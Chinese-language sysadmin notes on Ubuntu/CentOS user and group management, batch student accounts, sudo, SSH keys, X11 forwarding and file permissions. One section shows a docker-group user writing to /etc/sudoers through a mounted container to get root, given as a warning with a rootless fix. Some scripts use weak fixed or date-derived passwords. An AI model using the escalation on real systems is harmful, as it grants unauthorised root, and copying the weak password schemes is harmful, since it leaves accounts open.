Ubuntu下的用户管理与远程登录
	安全


linux简介3|用户与权限管理, 增加sudo权限

emacs 编辑器：http://www.gnuemacs.org/
DB7DW3TQ17

========================================
添加新用户、删除用户、修改用户
----------------------------------------
建立用户的步骤：http://www.2cto.com/os/201211/167632.html
1).增加用户useradd, 设置密码 passwd; 2).创建家目录 -d 3). 指定shell位置 -s



一步搞定[推荐方式]：
# useradd -s /bin/bash -d /home/sam  -m sam
# passwd sam



新建组
# groupadd -g 1001 docker2

新建用户，指定用户uid和gid
# useradd -s /bin/bash -d /home/wangjl2  -m wangjl2 -u 1012 -g 1001
# passwd wangjl2 # 修改密码




1. Ubuntu下带导引的创建用户方式：$ sudo adduser wangjl
不推荐使用。



2. 添加用户
$ sudo useradd -m -s /bin/bash steven
然后设置密码： 
$ sudo passwd

没有家目录？ 
一步到位的方法是加上 -s /bin/bash 参数。

refer:
http://blog.csdn.net/bxyill/article/details/8076846





3.更多用户操作
删除用户：
语法：userdel [-r] [要删除的用户的名称] 
例如：# userdel -r tete

切换用户
su - wangjl
输入密码即可。


退出登录
logout

修改密码：
passwd
修改自己的密码。






4. 新增用户，并新建家目录、数据目录，建立软链接指向数据目录
(1) 传递默认参数
$ cat b.sh 
name=$1
name=${name:=default}
echo $name

$ bash b.sh www 


(2) 如果没有参数则报错退出
$ cat c.sh 
name=$1
if [ "$1" == "" ]
then
  echo "You must input a username"
  exit
fi
echo $name

$ bash c.sh 
You must input a username
$ bash c.sh ww
ww


(3) 
$ addUser.sh
##1
usr=$1
if [ "$1" == "" ]
then
  echo "You must input a username"
  exit
fi
echo "add new user: "$usr

##2
pass=$2
if [ "$2" == "" ]
then
  pass=`date|md5sum |head -c 10`
fi
echo "password: "$pass

##3
useradd -s /bin/bash -d /home/${usr} -m ${usr}
mkdir /data/${usr}
chown ${usr} /data/${usr}
chgrp ${usr} /data/${usr}

ln -s /data/${usr} /home/${usr}/data
##4
#echo $pass | passwd  $usr --stdin
echo "${usr}:${pass}" >${pass}.log
chpasswd < ${pass}.log
rm ${pass}.log

echo "done!"

运行 
$ sudo bash addUser.sh wuxc
add new user: wuxc
password: 9ddc1ad13f


############
删除用户 
$ usr="yuanx"
$ sudo userdel -r ${usr}
$ sudo rm -rf /data/${usr}




5. 修改用户 uid 

# usermod -u 123 jiba   #修改jiba用户的uid为123 
# groupmod -g 123 jiba  #修改jiba用户的gid为123   

检查:
# id -u jiba
# id -g  jiba





========================================
|-- [批量]添加与删除用户名和密码
----------------------------------------
场景：很多学生要使用机器，需要批量添加用户名，并设置随机密码。
OS: Ubuntu1604
您需要root权限/sudo权限才能进行本文的操作。


https://www.cnblogs.com/lanxuezaipiao/archive/2012/12/01/2797440.html
基本上，批量添加用户有两种方式，一是用useradd + passwd命令配合脚本来添加，二是用newusers+chpasswd来添加。




一. 比较好的方式
(1)模板: https://www.jb51.net/article/58865.htm

$ cat useradd.sh
#!/bin/bash
for name in tom joy john mark james
do  useradd $name
    echo "redhat" | passwd --stdin $name
done


(2) 新建目录: 
新增用户，添加到分组2020
家目录为 /home/uname/，其中一个软连接 data 指向 /data/uname
数据文件存放地址 /data/uname/, 其中一个文件夹 homework 用于提交作业


users.txt中是用户名，一个用户名一行
lilei
xiaoming



$ cat addUser.sh

## groupadd 2020

cat users.txt | while read id; 
do 
	if [ -n $id ]
	then
		echo '===== for user: ' $id;
		useradd -d /home/$id -s /bin/bash -m $id ##-G 2020
		echo $id"123" | passwd --stdin $id
		echo "--> end of task 1: add usr & change pass" 
		
		mkdir -m 700 /data/student2020/$id
		mkdir -m 700 "/data/student2020/$id/homework"
		ln -s /data/student2020/$id /home/$id/data
		# ln -s /data/student2020/$id/homework /home/wangjl/homework/$id
		chown -R $id /data/student2020/$id
		chgrp -R $id /data/student2020/$id
		echo "--> end of task 2: add links"
	else
		echo "The username is null!"
	fi
done;



(3) 汇总学生作业的快捷方式到管理员目录下的/homework/
好像作用不大，因为可见权限太难控制。
快捷方式不能访问，还是直接使用sudo直接复制或者逐个查看。


$ cat addlinks.sh
# v0.2
mkdir homework

cat users.txt | while read id; 
do
	if [ -n $id ]
	then
		echo '===== for user: ' $id;
		ln -s /data/student2020/$id/homework /home/wangjl/homework/$id
	else
		echo "The username is null!"
	fi
done;











二. 之前的方式

已知学生们的学号：
注意一定要删除最后一行的空行！！
$ cat stu_id.txt
2097471001
2097471002
2097471003
2097471004
2097471005
2097471006
2097471007
2097471008
2097471009
2097471010

检查/home/目录：
$ ls /home/
lost+found  songj  wangjl  wjl  www

要点：使用chpasswd更改用户密码
chpasswd是一个批量更改用户密码的命令，它是先读取一个文件，然后根据文件的内容，然后更改密码。
文件内容格式如下：USERNAME:PASS WORD

1. 批量添加用户、添加家目录、设置登录的shell
$ head -n 10 stu_id.txt|awk '{print "sudo useradd -d /home/"$1" -s /bin/bash -m "$1}'
sudo useradd -d /home/2017471001 -s /bin/bash -m 2097471001
sudo useradd -d /home/2017471002 -s /bin/bash -m 2097471002
...

$ head -n 10 stu_id.txt|awk '{print "sudo useradd -d /home/"$1" -s /bin/bash -m "$1}' | bash

检查密码表尾部，确实添加了10个新用户
$ tail -n 11 /etc/passwd

检查home目录，确实添加了10个新文件夹
$ ls /home/




2.批量生成随机密码
$ cat create.sh
#!/bin/bash

n=1
total=10

while(($n<=$total));
        do
			echo $n|md5sum |head -c 6
			echo ""
			let "n++"
        done

$ chmod u+x create.sh
$ ./create.sh > random.txt
$ cat random.txt
b02632
26ab0d
...


3.为用户设置新密码
合并用户名和随机密码，用:隔开
$ paste -d ':' stu_id.txt random.txt
2097471001:b02632
2097471002:26ab0d
...

$ paste -d ':' stu_id.txt random.txt >mima.log

批量导入密码
$ sudo chpasswd<mima.log

密码设置到此结束。


此时，可以尝试使用mima.log中的用户名和密码登录系统了。
2097471008@xxxx:~$ pwd
/home/2097471008



4.批量删除用户
课程结束，需要删除学生用户名和相应的文件。

删除用户
$ awk '{print "sudo userdel "$1}' stu_id.txt |bash
删除家目录文件夹数据
$ awk '{print "sudo rm -fR /home/"$1}' stu_id.txt|bash


或者：
userdel -r username   
-r表示连主目录一起删除。

检查删除效果：
$ tail -n 2 /etc/passwd

$ ls /home


5.more：
如何定期自动更新用户密码？
如何强制删除还在使用的用户账户？
如何对学生用户分组进行管理？限制CPU和内存用量？
	useradd -g test phpq //新建phpq用户并增加到test工作组



refer
1. #使用date 生成随机字符串  
date +%s%N | md5sum | head -c 10  

2. 批量新增用户 http://blog.csdn.net/yanzengzeng/article/details/50529310
3. linux用户管理 http://www.cnblogs.com/xd502djj/archive/2011/11/23/2260094.html






========================================
|-- CentOS7.9 重装系统后，怎么快速恢复用户？
----------------------------------------
提前备份用户注册数据，就是 /etc/passwd 文件。 

重装后根据 uname 和 uid 恢复用户，则用户的文件权限不变。

useradd -s /bin/bash -d /home/${usr} -m ${usr} -g 1001 -u ${uid}




1. 尝试写成脚本

(1) 测试: 家目录下查看还没有的用户

难点: 一行空格隔开的文字变数组

$ ls -lth /home | awk '{print $3"\t"$9}' | grep -P "^10\d{2}" | while read id; do 
arr=($id);
echo ${arr[0]} "|" ${arr[1]};
done;


# 读取一行信息: 获取uid和uname
uid=1005 &&	usr=chengww

测试脚本
$ ls -lth /home | awk '{print $3"\t"$9}' | grep -P "^10\d{2}" #数据来源

$ sudo bash ~/backup/recoverUser_add_sshDir193.sh 1005 chengww
$ sudo bash ~/backup/recoverUser_add_sshDir193.sh 1025 yushiya
$ sudo bash ~/backup/recoverUser_add_sshDir193.sh 1004 chengm
$ sudo bash ~/backup/recoverUser_add_sshDir193.sh 1007 huangcy


循环: 调用脚本(2)
$ ls -lth /home | awk '{print $3"\t"$9}' | grep -P "^10\d{2}" | while read id; do 
arr=($id);
echo -e "\n\n"${arr[0]} "|" ${arr[1]};
sudo bash ~/backup/recoverUser_add_sshDir193.sh ${arr[0]} ${arr[1]};
done;



(2) 根据 uid 和 uname 恢复的脚本

$ cat ~/backup/recoverUser_add_sshDir193.sh
# 1) input 
uid=$1
if [ "$1" == "" ]
then
  echo "You must input a uid as 1st parameter"
  exit
fi

usr=$2
if [ "$2" == "" ]
then
  echo "You must input a username as 2nd parameter"
  exit
fi

# usr exist?
getent passwd $usr  > /dev/null

if [ $? -eq 0 ]; then
    echo "yes the user exists, do nothing, exit."
	exit
else
    echo "No, the user does not exist, we'll add one:"
fi

# 2) add user
echo ">>>> usr: $usr, uid: $uid"
useradd -s /bin/bash -d /home/${usr} -m ${usr} -g 1001 -u ${uid}
pass=`date|md5sum |head -c 10`
echo $pass | passwd --stdin $usr
echo ">>>> pass: $pass"


# 3) add dir and file for ssh key
myPath="/home/${usr}/.ssh"

if [ ! -d "$myPath"]; then
	mkdir "$myPath";
	chown $usr /home/${usr}/.ssh;
fi
chmod 700 /home/${usr}/.ssh;


myFile="/home/${usr}/.ssh/authorized_keys"
if [ ! -f "$myFile" ]; then
	touch "$myFile";
	chown $usr /home/${usr}/.ssh/authorized_keys
fi
chmod 600 /home/${usr}/.ssh/authorized_keys
echo ">>>> ssh file: /home/${usr}/.ssh/authorized_keys"




















========================================
sudo指令
----------------------------------------
功能： 以root的身分执行命令
语法： sudo 其他指令
用户： 被root加入『/etc/sudoers』文件中的用户

1．root的密码除了root本人知道外，不需被其他需要用到root权限用户知道，因为使用sudo时，要求输入的密码是『该位用户自己的密码』。

2．把所有可执行sudo指令的用户都规范在『/etc/sudoers』这个文件中，root可以很容易地掌控整个系统。




执行sudo su -成root的用户，我觉得应该和root用户没什么区别吧？

而普通用户使用sudo 来执行只有root才能执行权限的命令，当然跟用root用户执行是不一样的，因为这时候他用的还是普通用户的环境变量啊

补充一下，用su -成root的用户还是有些环境变量是和root登陆是不一样的。另外，它们的uid也是不一样，只有euid是相同的。




========================================
|-- Linux给用户添加sudo权限
----------------------------------------
警告： 赋予普通用户sudo权限有风险，相当于他获得了root权限。谨慎再谨慎！

1. 添加用户到组

usermod -a -G sudo userName2




2. 修改sudoers文件

有时候，linux下面运行sudo命令，会提示类似： 
xxx is not in the sudoers file.  This incident will be reported. 
这里，xxx是用户名称，然后导致无法执行sudo命令，这时候，需要为用户添加sudo权限：

进入超级用户模式。也就是输入"su -",系统会让你输入超级用户密码，输入密码后就进入了超级用户模式。（当然，你也可以直接用root）
添加文件的写权限。也就是输入命令"chmod u+w /etc/sudoers"。 
编辑/etc/sudoers文件。也就是输入命令"vim /etc/sudoers",进入编辑模式，找到这一行：
"root ALL=(ALL) ALL"
在起下面添加
"xxx ALL=(ALL) ALL"
(这里的xxx是你的用户名)，然后保存退出。


把root那行复制后改成hadoop，hadoop就有了sudo权限，需要sudo密码则为ALL，不需要则NOPASSWD:ALL。
root      ALL=(ALL)       NOPASSWD:ALL
wangjl      ALL=(ALL:ALL)   ALL


撤销文件的写权限。也就是输入命令"chmod u-w /etc/sudoers"。 

然后就行了。





http://blog.chinaunix.net/uid-25305993-id-126661.html
http://www.cnblogs.com/linjiqin/archive/2013/03/04/2943255.html
https://www.cnblogs.com/jxhd1/p/6528574.html




========================================
|-- 通过特权组获得 sudo 权限
----------------------------------------
1. 新建分组
$ sudo groupadd admin #添加组
$ sudo gpasswd -a $USER admin #将登陆用户加入到组中
Adding user wangjl to group admin

$ newgrp admin #更新用户组
$ groups #或者 id 命令 查看当前用户所在的组
docker adm cdrom sudo dip plugdev lpadmin lxd sambashare wangjl






2. 为分组添加特权
$ sudo vim /etc/sudoers
最后一行是: #includedir /etc/sudoers.d

$ sudo vim /etc/sudoers.d/config
%admin  ALL=(ALL)       ALL

可能必须用这句话再加一遍
$ sudo usermod -a -G admin ${usr} #另一个把用户添加到分组的方式

(2) 测试 
$ useradd -s /bin/bash -d /home/sam  -m sam






3. 把用户加到分组
$ ls /home | grep wangxf
wangxf

$ sudo gpasswd -a wangxf admin
$ newgrp admin #更新用户组

$ groups wangxf
wangxf : jinwf admin


查询属于该组的用户名:
$ getent group admin
admin:x:1002:wangjl,wangxf








========================================
|-- [安全] docker组普通用户如何拿到系统sudo权限 [危险操作，谨慎]
----------------------------------------
1. 管理员给新人 tom 新开了个账号
$ usr="tom"
$ sudo useradd -s /bin/bash -d /home/${usr} -m ${usr}
$ sudo passwd ${usr}

根据需要，又把 tom 加入了 docker 组：
$ sudo usermod -G docker ${usr}

查看
$ id tom
uid=1010(tom) gid=1012(tom) groups=1012(tom),1004(docker)




2. 普通用户 tom 自己获取 sudo 权限

tom登录后启动 docker
tom@sustc-HG:~$ docker run --name test1 --rm -it -v /etc/:/home/test ubuntu:20.04 bash
root@90686e99aa5b:/# cd /home/test/
root@90686e99aa5b:/home/test# echo "tom  ALL=(ALL:ALL) ALL" >> sudoers
root@90686e99aa5b:/home/test# exit
exit
 
# 普通用户没有权限
tom@sustc-HG:~$ cat /etc/sudoers
cat: /etc/sudoers: Permission denied
 
# 已经获取 sudo 权限
tom@sustc-HG:~$ sudo tail -n 1 /etc/sudoers
tom  ALL=(ALL:ALL) ALL

小结：这就意味着 把一个普通用户加入docker组，相当于给他了 sudo 权限。

我们的服务器人人可以启动docker，就意味着人人都是管理员权限？！
好可怕！
怎么补救！
恳请各位大佬出谋划策。

容器内的 root 用户和宿主机上的 root 用户是同一个吗？
答案是：是的，它们对应的是同一个 uid。原因我们在前面已经解释过了：整个系统共享同一个内核，而内核只管理一套 uid 和 gid。

而且即便容器内外只共享uid和gid，不共享用户名，组名。权限是依赖id的，也就是说可以使用容器修改一些普通用户无法修改的内容。





3. 确实危险
在 github 上问了一下，确实如此: 
	https://github.com/docker/for-linux/issues/1318#issuecomment-950963782

还是有解决办法的：如果有这个顾虑，可以运行 rootless 模式。 
	Run the Docker daemon as a non-root user (Rootless mode) | Docker Documentation
	https://docs.docker.com/engine/security/rootless/



ref:
https://blog.csdn.net/wangjunliang/article/details/120842914





========================================
win10 通过 ssh key 免密码登录服务器： -i 本地密钥文件路径
----------------------------------------
1. 在 win10 的git bash 中生成密钥对
$ ssh-keygen -t rsa -C "test"
注：passphrase 是证书口令，以加强安全性，避免证书被恶意复制。
执行命令后，在 ~/.ssh 下生成 id_rsa/id_rsa.pub 两个文件，分别是私钥/公钥。

$ ls -lth ~/.ssh
total 13K
-rw-r--r-- 1 admin 197121 5.2K 8月   5 22:29 known_hosts
-rw-r--r-- 1 admin 197121  400 9月   1  2019 id_rsa.pub
-rw-r--r-- 1 admin 197121 1.7K 9月   1  2019 id_rsa

私钥由客户端本地留存。


2. 公钥上传保存到
$ cat ~/.ssh/id_rsa.pub
把内容复制到远程服务器 ~/.ssh/authorized_keys 中


3. 要保证 .ssh 和 authorized_keys 都只有用户有写权限。否则验证无效。

chmod -R 700 ~/.ssh/
chmod 600 ~/.ssh/authorized_keys


4. 然后win10端就可以免口令登录了
$ ssh wangjl@y.biomooc.com
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-147-generic x86_64)


(2) 如果密钥不是默认文件名，使用 -i 参数指定文件完整路径
$ ssh wangjl@x.biomooc.com -i ~/.ssh/id_rsa_193





========================================
Xming + PuTTY 在Windows下远程Linux主机GUI
----------------------------------------
概述：
1.[免安装]putty实现了ssh安全登录，但是只有命令行界面。
	当你不需要图形界面，不需要传递文件时，putty就够用了。
2.[需要安装]Xming实现了ssh下的图形界面，在需要的时候提供图形界面。
3.[免安装]winscp提供了sftp服务，基于ssh的上传下载文件。


即：X11是X Window System主版本11的缩写，它不光是一个基本的GUI软件，X11也被定义为一个网络协议，因为X11提供了非常灵活的网络访问接口。

SSH X11-Forwarding
只要打开SSH X11-Forwarding后，远程的图形界面就可以通过SSH的加密隧道“拽”到本地的xserver上来，无需手动在远程设置DISPLAY变量。
1. 在win上双击打开 Xming，右下角托盘会有X图标；
2. 双击打开Putty，设置X11-Forwarding方法：Connection -> SSH -> X11 -> X11 frowarding -> Enable X11 forwarding,填写 localhost:0
3. 检查X11 forwarding是否开启方法：登录远程主机后，运行：set | grep DISP 
4.1(for CentOS). 在putty中输入 $ xclock &
windows端应该有Xming时钟窗口弹出。
如果没有该命令，请先安装 $ sudo yum install xclock 

4.2(for Ubuntu).在putty中输入 $ gedit
windows端会出现gedit的编辑图形窗口。
表示成功。

4.3 通用linux
进入R，输入 
> plot(mtcars)
如果出现几行几列的点图，则表示Xming成功。




所需软件：

1） SSH客户端 - 这里我们使用putty
    下载地址：https://www.putty.org/
	http://www.chiark.greenend.org.uk/~sgtatham/putty/

2）X Server端 - 我们使用标准X.Org X server的Windows移植版本Xming
	Xming的介绍见：http://www.straightrunning.com/XmingNotes/
	点击下载下面地址页面里的xming里面的exe文件下载（建议下载最近版）
	http://sourceforge.net/projects/xming/files/
	注意这里面有两个xming和xming-mesa，前者用OpenGL展示界面，后者用Mesa展示界面，对于一般用户差别不大，任选一个即可
3)   字体库：
	点击下载下面地址页面里的xming-fonts里面的字体库exe文件下载（建议下载最近版）
	http://sourceforge.net/projects/xming/files/


	
	
	

调试过程：PuTTY + Xming 远程使用 Linux GUI


    在家里的PC上用VMWare做了一个Oracle Enterprise Linux虚拟机做数据库，虚拟机OEL没启用图形界面，因此需要在PC上装一个X Window Server才能使用GUI。

    看Wiki系统地了解了一下X Window System。X Window System（常被简称为X11或X），是一套基于X display protocol的windowing system，X GUI环境的功能包括窗口的绘制、移动，以及与鼠标、键盘等输入设备的交互。X 协议当前版本为MIT在1987年9月制定的11版----这就是X11的来历，最新版则是2008年9月发布的X11R7.4。

    X采用C/S模型：一个X server 和多个应用程序（client）通信。server接收client的请求绘制窗口，并将来自鼠标、键盘等设备的输入传递给client。

    初学X的用户经常被描述如何远程使用Linux GUI环境的文档搞糊涂：Linux主机上的应用程序被称为client，而用户终端计算机被称为server，看上去好像说反了。实际上，X是从程序结构而非用户或硬件环境的角度来描述的，在用户终端上工作的X server为应用程序提供服务，所以被看作server，而Linux主机上的应用程序接受服务，所以被看作client。

    X server和client可以位于同一计算机上，例如在Linux主机上使用KDE等桌面环境就是这种模式。X server也可以通过同构网络、异构网络或Internet与client通信。

    X server与client之间的通信是不加密的，这个问题可以通过SSH解决。SSH是Secure Shell的简称，SSH可以看作是通信被加密压缩版的telnet。我需要用到SSH的forwarding功能，当X server与client所在计算机都支持SSH协议时，X server与client之间不安全的TCP/IP连接可以转送到（forwarding）二者之间建立的SSH连接上。

    说了一堆概念，现在可以挽起袖子干活了。Linux主机（A, IP: 192.168.1.201）和Windows客户机（B, IP: 192.168.1.101）都已经装好了，我要做的就是在 B 上安装一个X server，一个SSH客户端，在A上启用SSH的X11 forwarding。

1 安装配置B上的X server

X server我选择的是Xming，这是一个免费的windows平台上的X server。需要安装两个组件，主程序和字体
	- Xming X server, Xming-6-9-0-31-setup.exe
	- Xming Fonts, Xming-fonts-7-3-0-22-setup.exe
    运行XLaunch配置Xming X server，将配置保存为.xlaunch 文件。使用默认设置即可。
	Display 代表一套 I/O 设备，包括显示、鼠标、键盘；Display Number 就是这套 I/O 设备的代号；同时 Display Number 还决定了 Xming X server 的 TCP 端口，端口号为 6000 + Display Number。Linux 主机上的应用程序通过此端口建立与 Xming X server 的连接。

    将配置保存为Xming.display.0.xlaunch。双击此文件就能启动X server，系统栏里多了一个Xming的图标。

2 安装配置B上的SSH
    SSH客户端使用PuTTY，PuTTY是freeware+greenware，就一个exe文件。
	配置 Session：配置主机IP，连接方式为SSH
	Connection\Data：保存连接使用的用户名
	Connection\SSH\X11：Enable X11 Forwarding，X display Location 为 localhost:0，这里的 0 就是配置 Xming X server 时指定的 Display Number。
	保存设置为 VSERVER01。

3 配置A上的SSH
    要允许Linux主机上的SSH X转发，查看 /etc/ssh/sshd_config 文件，加入以下一行，
X11Forwrding yes
    至此配置完成。在B上使用PuTTY连接到A，输入xclock &，可以看到X server工作的效果了。
    或者 使用R语言画图，看看效果。
    或者 使用emacs编辑器，试试显示效果。


Xming总体性能，流畅度等不及XManager(付费)： http://www.netsarang.com/
http://www.netsarang.com/xmanager_enterprise_download.html
	

还有其他实现windows下访问X11 forwarding的方案，例如
Cygwin/X - http://x.cygwin.com/
WeirdX - http://www.jcraft.com/weirdx/index.html


refer:
http://blog.csdn.net/defeattroy/article/details/7466018
http://www.zw1840.com/blog/zw1840/2008/10/putty-xming-linux-gui.html





========================================
|-- 在win11上使用 Xming + Xshell 可视化 centOS7 图形界面
----------------------------------------
1. 启动Xming
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Xming
双击 XLaunch
	四宫格默认第一个，Diplay number:0
	后面的都直接点下一步即可：--> Start no client -->Clipbard-->完成。

2.设置允许的IP
	打开安装目录 D:\Program Files (x86)\Xming
	下的 X0.hosts，注意这个0就是上一步的 Diplay number
	编辑该文件，在localhost下面一行，添加Linux服务器的IP地址。
		localhost
		10.10.117.158

3.打开xshell
	顶部文件夹 打开，选择 服务器登录信息，点击 属性。
	左侧 连接-SSH-隧道，右侧底部 X11转移-X DISPLAY(D): localhost:0.0
	需要设置成localhost:0.0  其中0.0中第一个0就是与上面的Display Number相对应的。

4.登录服务器，
	$ export DISPLAY=本机IP地址:0.0 #我似乎之前执行了，这次没执行
	$ echo $DISPLAY
	localhost:14.0
	$ gedit #弹出编辑器界面

	或者R绘图
	$ R
	> plot(1) #弹出R绘图界面




========================================
Linux用户与组基础
----------------------------------------

用户与组：便于管理；
用户ID为32位，从0开始，为了兼容，ID限制在60000以下；
用户分为3中：
	-root用户 ID为0；
	-系统用户 1-499
	-普通用户 500以上
id命令显示用户ID等信息；
passwd命令可以修改当前密码；


用户相关信息：/etc/下的三个文件：
	passwd（用户信息） 
	shadow（用户密码，加密后的）  
	group（组信息）

查看登陆的用户（命令越长，信息越少。。。）
	whoami 显示当前用户
	who显示那些用户已经登陆系统
	w 显示那些用户已经登陆，并且在干什么

创建用户
	useradd newUSR		#会复制/etc/skel/中的文件复制到新用户家目录中；
	支持如下参数：
		-d 家目录
		-s 登陆shell
		-u userid
		-g 主族
		-G 附属组（最多31个附属组）
修改用户	usermod命令	
删除用户	userdel newUSER		#-r 参数删除家目录


组 - 一般是按照部门分组
创建组	groupadd linux
修改组	groupmod
删除组	groupdel

查看自己的组：groups

例子：
groupadd manage	#创建manage组
useradd -G manage david 	#创建新用户并指定组



========================================
|-- 把已有用户wangjl添加到已有的组docker中
----------------------------------------
$ sudo usermod -a -G docker wangjl
然后切换用户为自己就可以使用docker了
$ su wangjl
$ docker images
$ docker version


使用id命令可以查看用户所属组
$ id
uid=1001(wangjl) gid=1001(wangjl) groups=1001(wangjl),1004(docker)




========================================
|-- 让普通用户拥有root的权限(有风险)
----------------------------------------
1.root登录
2.adduser 用户名
3.passwd 用户名
确定密码

4[重要的是这一步].修改/etc/passwd即可，把用户名的ID和ID组修改成0。



========================================
|-- linux查看用户组所有成员
----------------------------------------

$ grep 'user1' /etc/group //找出用户组的gid
user1:x:1004:  这里可能就是用户名列表，逗号隔开。    //得出gid=1004

$ awk -F":" '{print $1"\t"$4}' /etc/passwd |grep '1004' //列出user1组的所有成员
user1         1004
user2         1004




========================================
|-- linux修改用户uid和gid
----------------------------------------
查用户uid和gid
$ id username


修改用户uid
# usermod -u new_uid username



新建组
# groupadd -g 1001 dockerGroup

修改组的gid
# groupmod -g new_gid groupname



修改用户的的gid
# usermod -g 新gid 用户名






========================================
Linux权限机制: 三种角色 UGO(User、Group、Other，合起来 all)，三种权限rwx
----------------------------------------
http://blog.chinaunix.net/uid-20422917-id-1682726.html

ls -l出来的东西：
权限	此文件的用户	此文件的用户组	大小	时间	文件夹名字
drwxr-x--- 2 root GroupA 4096  5月 19 10:10 wangjl


权限三种：读r、写w、执行x;（目录必须有x权限，否则无法查看其内容。）
三种用户区别对待(UGO模型)：权限的UGO模型：user、group、other3组，
	用户u、组g、其他用户o
每三个一组，共9个选项；（第一个d表示是文件夹）
（-r递归的修改文件权限。）


命令chown用以改变文件的所属用户：
	chown linuxUsr mydir 
	-R 参数递归的修改目录下的所有文件的所属用户；
	
命令chgrp用以改变文件的所属组，chgrp oldGroup newGroup 如：
	chgrp groupA GroupDir
	-R 参数递归的修改目录下的所有文件的所属组；

递归的去掉该目录下所有文件和文件夹的user的写权限，可能是为了防止误操作：
$ chmod -R u-w fq_files



#############
问题1：
#############
用root登陆时创建用户，
useradd wjl
然后修改密码：
passwd wjl
输入2遍后即可使用；

用新用户登陆：
su wjl

输入密码，发现没有家目录？ 用-d指定家目录。



1.增加用户组
groupadd remoteUser

2.增加新用户，能分组，没有家目录
useradd -G remoteUser wangjl

删除用户：
userdel 选项 用户名
 - 常用的选项是-r，它的作用是把用户的主目录一起删除。
 - 此命令删除用户sam在系统文件中（主要是/etc/passwd, /etc/shadow, /etc/group等）的记录，同时删除用户的主目录。

root@ubuntu:/home# usermod -s /bin/wangjl -d /home/wangjl -m wangjl

增加新用户，不能分组，有家目录
root@ubuntu:/usr# useradd -d /home/zhuyj -m zhuyj

增加新用户，能分组，有家目录
root@ubuntu:/usr# useradd -d /home/zhuyj -m -G remoteUser zhuyj





#############
问题2：不能使用TAB键、上下键，命令行不显示当前路径的解决
#############
http://www.2cto.com/os/201211/167632.html

因默认ubuntu创建的普通帐号，默认shell为/bin/sh，而这不支持tab等键的，所以将「指定用户」帐号的shell改为/bin/bash就可以了。
 
1).查看当前的shell：
# echo $SHELL
/bin/sh

2).修改shell为/bin/bash：
# usermod -s /bin/bash 用户名

一步到位的方法是加上 -s /bin/bash 参数。






修改权限：
	chmod 模式 文件
模式如下：
ugo分别代表用户、组和其他；
a可以代指ugo；
+ -代表加入或删除相应权限；
r w x代表三种权限；

模式实例：
chmod u+rw wjl
chmod g-x wjl
chmod go+r wjl
chmod a-x wjl

chmod也支持以数字方式修改权限，三个权限分别为：
r =4(2^2)
w =2(2^1)
r =1(2^0)

使用数字权限时，没组权限分别为对应数字之和：
rw=4+2=6
rwx=4+2+1=7
r-w=4+1=5

所以，使用数字表示ugo权限使用如下方式表示：
chmod 660 wjl		==	rw-rw---
chmod 775 wjl		==	rwxrwxr-x




显示所有已有组
groupmod <连按三次tab键>

这会列出现在你系统上的所有用户组，现在添加用户到已存在的组吧，运行下列命令：
sudo adduser 用户名 组名

例如，如果你想添加Richard到sudo组，运行下列命令：
sudo adduser richard sudo

好了，去验证用户的相关组，运行下列命令：
id richard

http://www.linuxidc.com/Linux/2013-10/91947.htm





========================================
 |--【实例】要求为各部门、员工建立相应的工作文件夹
----------------------------------------
1.所有目录、文件在一个文件夹下；
2.每个部门之间不可访问各自的文件夹；
3.每个员工在本部门文件夹下有一个所属文件夹；
4.同部门员工可以查看，但不能修改，用户仅能修改自己的文件夹；


创建组：groupadd gf
创建用户：useradd -G gf zyj
	useradd -G gf dgy
home下创建文件夹：mkdir girl
修改对应组到对应文件夹：chgrp gf girl
不同组不能访问，则去掉o中的权限：
	chmod o-rx girl
	chmod o-rx boy
设置密码：passwd wjl
	passwd zyj
	
登陆其中一个用户：发现确实无法cd进入；

在boy中建立文件夹：mkdir wjl
修改所属用户：chown wjl wjl
去掉o权限：chmod o-rx wjl
修改所属组：chgrp bf wjl





========================================
Linux扩展权限: suid、sgid、sticky
----------------------------------------
除了普通权限外，还有三个特殊权限。
########################################################################
权限	对文件的影响					对目录的影响
suid	以文件的所属用户身份执行，而非执行文件的用户；	无(对目录无效)
sgid	以文件所属组身份执行	在该目录中创建的任意新文件的所属组与该目录的所属组相同
sticky	无(对文件无效)		对目录拥有写入权限的用户仅可以删除其拥有的文件，无法删除其他用户所拥有的文件
########################################################################

设置suid		chmod u+s linuxdir
设置sgid		chmod g+s linuxdir
设置sticky	chmod o+t linuxdir

与普通权限一样，特殊权限也可以使用数字方式表示：
	- SUID =4
	- SGID = 2
	- Sticky = 1
所以，我们可以通过以下命令设置：
chmod 4755 linuxdir




2. 所有者为root的passwd命令
$ ls -l /usr/bin/passwd
-rwsr-xr-x. 1 root root 27832 Jun 10  2014 /usr/bin/passwd

普通用户使用时会以该文件所属用户root身份执行。
这样，passwd就能访问只有root才能访问的密码文件了。
$ ls /etc/shadow -l
----------. 1 root root 4433 Mar 18 16:56 /etc/shadow #CentOS
-rw-r----- 1 root shadow 1885 Dec 30 22:06 /etc/shadow #Ubuntu







========================================
更精细的权限管理：ACL权限控制
----------------------------------------

我们看某个文件（Linux系统中目录也是文件，一切皆是文件）是否支持 ACL 权限，首先要看文件所在的分区是否支持 ACL 权限。
1. 查看当前系统有哪些分区：df -h
$ df -h






2.查看指定分区详细文件信息：dumpe2fs -h 分区路径
下面是查看 根分区/ 的详细文件信息

$ dumpe2fs -h /dev/mapper/centos-root






3.开启分区 ACL 权限
(1)临时开启分区 ACL 权限
mount -o remount,acl /
重新挂载根分区，并挂载加入 acl 权限。注意这种命令开启方式，如果系统重启了，那么根分区权限会恢复到初始状态。

(2)永久开启分区 ACL 权限
1) 修改配置文件 /etc/fstab

上面是修改根分区拥有 acl 权限
UUID=490ed737-f8cf-46a6-ac4b-b7735b79fc63 /                       ext4    defaults,acl        1 1

2) 重新挂载文件系统或重启系统，使得修改生效
mount -o remount /







4、设定 ACL 权限：setfacl 选项 文件名
(1)给用户设定 ACL 权限：setfacl -m u:用户名:权限 指定文件名
(2)、给用户组设定 ACL 权限:setfacl -m g:组名:权限 指定文件名
注意：我们给用户或用户组设定 ACL 权限其实并不是真正我们设定的权限，是与 mask 的权限“相与”之后的权限才是用户的真正权限，一般默认mask权限都是rwx，与我们所设定的权限相与就是我们设定的权限。mask 权限下面我们会详细讲解
范例：所有者root用户在根目录下创建一个文件目录/project，然后创建一个QQ群所属组，所属组里面创建两个用户zhangsan和lisi。所有者和所属组权限和其他人权限是770。
然后创建一个旁听用户 pt，给他设定/project目录的 ACL 为 r-x。

目录 /project 的所有者和所属组其他人权限设定为 770。接下来我们创建旁听用户 pt，并赋予 acl 权限 rx

